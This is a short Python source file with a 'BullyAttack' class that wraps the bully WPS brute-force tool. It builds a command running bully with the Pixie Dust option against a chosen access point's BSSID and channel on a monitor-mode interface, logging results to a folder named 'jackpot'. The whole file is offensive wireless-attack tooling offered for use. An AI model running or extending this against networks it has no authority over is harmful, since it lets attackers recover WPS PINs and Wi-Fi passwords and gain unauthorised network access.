from datetime import datetime


class BullyAttack:
    """Bully command wrapper"""
    def __init__(self, bssid=None, channel=None):
        self.bssid = bssid
        self.channel = channel

    def logpath(self):
        timestamp = datetime.now().strftime("%d%m%Y%H%M%S")
        return "jackpot/bullylog-{0}-{1}.txt".format(self.bssid, timestamp)

    def command(self):
        return "bully -b {bssid} -c {channel} -o {logpath} --pixiewps wlan1mon".format(
            bssid=self.bssid, channel=self.channel, logpath=self.logpath()
        )
